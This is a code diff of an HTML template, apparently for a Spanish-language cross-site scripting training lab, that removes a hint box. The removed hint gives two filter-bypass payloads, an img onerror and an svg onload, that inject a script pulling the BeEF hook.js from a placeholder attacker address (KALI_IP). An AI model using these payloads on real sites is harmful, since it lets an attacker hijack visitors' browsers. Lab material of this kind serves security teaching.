@@ -55,16 +55,6 @@
       {% endif %}
     </div>
 
-    <div class="hint-box mt-2">
-      <div class="hint-title">vectores de bypass para BeEF</div>
-      <p>
-        El filtro bloquea <code>&lt;script</code> pero no otros tags con event handlers.<br><br>
-        <strong style="color:var(--green-dim);">Via &lt;img&gt;:</strong><br>
-        <code>&lt;img src=x onerror="var s=document.createElement('script');s.src='http://KALI_IP:3000/hook.js';document.head.appendChild(s)"&gt;</code><br><br>
-        <strong style="color:var(--green-dim);">Via &lt;svg&gt;:</strong><br>
-        <code>&lt;svg onload="var s=document.createElement('script');s.src='http://KALI_IP:3000/hook.js';document.head.appendChild(s)"&gt;</code>
-      </p>
-    </div>
   </div>
 
   <div>
